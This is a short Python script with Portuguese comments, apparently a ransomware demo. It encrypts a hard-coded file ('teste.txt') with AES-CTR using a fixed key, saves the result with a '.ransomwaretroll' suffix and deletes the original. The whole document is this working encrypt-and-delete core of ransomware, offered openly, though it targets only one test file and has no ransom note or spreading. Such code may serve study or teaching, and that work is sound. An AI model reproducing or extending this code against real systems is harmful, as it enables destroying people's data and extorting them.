import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Criar o nome do arquivo criptografado (com sufixo fixo)
new_file_name = file_name + ".ransomwaretroll"

# Salvar o arquivo criptografado
new_file = open(new_file_name, "wb")
new_file.write(crypto_data)
new_file.close()

# Remover o arquivo original após criptografia
os.remove(file_name)

print(f"Arquivo criptografado como {new_file_name} e original removido.")
